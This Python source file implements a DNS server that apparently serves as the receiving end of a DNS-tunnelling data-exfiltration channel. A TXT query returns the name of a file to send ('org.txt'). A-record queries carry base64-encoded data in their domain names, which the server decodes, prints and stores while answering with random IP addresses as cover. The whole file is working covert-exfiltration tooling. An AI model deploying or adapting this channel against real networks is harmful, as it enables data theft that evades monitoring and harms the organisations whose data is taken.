__author__ = "Adel Tchernitsky"


from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A, TXT
import base64
import threading
import random


ADDRESS = "0.0.0.0"
PORT = 53
TTL = 60
MSG_TYPE = "A"


collected_data = {}
data_lock = threading.Lock()
current_file_name = ""


def get_random_responses():
    if MSG_TYPE == "A":
        parts = [str(random.randint(0, 255)) for i in range(4)]
        return ".".join(parts)


def choose_file():
    global current_file_name
    current_file_name = "org.txt"
    # current_file_name = input("Choose which file you'd like to receive: ")


def handle_client_message(request):
    query_type = QTYPE[request.q.qtype]
    if query_type == "TXT":
        choose_file()

    elif query_type == "A":
        # Get the full domain name requested
        domain = str(request.q.qname)

        # Get client's message
        data = domain.replace(".", "")
        try:
            padded = data + "=" * (-len(data) % 4)
            decoded = base64.b64decode(padded).decode(errors="ignore")
        except Exception as e:
            decoded = f"<decode error: {e}>"
        print(f"Client sent: {decoded}")

        # Store safely
        with data_lock:
            collected_data[request.header.id] = decoded.encode()


def create_response(request):
    query_type = QTYPE[request.q.qtype]
    query_name = request.q.qname

    if query_type == "A":
        # Prepare response
        reply = request.reply()  # This does a lot automatically: Copies transaction ID, Copies flags,...
        reply.add_answer(RR(query_name, QTYPE.A, rdata=A(get_random_responses()), ttl=TTL))
        return reply

    if query_type == "TXT":
        reply = request.reply()  # This does a lot automatically: Copies transaction ID, Copies flags,...
        reply.add_answer(RR(query_name, QTYPE.TXT, rdata=TXT(current_file_name), ttl=TTL))
        return reply


class SimpleResolver(BaseResolver):
    def resolve(self, request, handler):
        handle_client_message(request)
        return create_response(request)


def back_to_file():
    print(collected_data)


def main():
    print("Starting DNS server on (0.0.0.0:53)")
    server = DNSServer(SimpleResolver(), address=ADDRESS, port=PORT)
    server_thread = threading.Thread(target=server.start, daemon=True)
    server_thread.start()

    while True:
        try:
            continue
        except KeyboardInterrupt:
            back_to_file()
            return


if __name__ == "__main__":
    main()
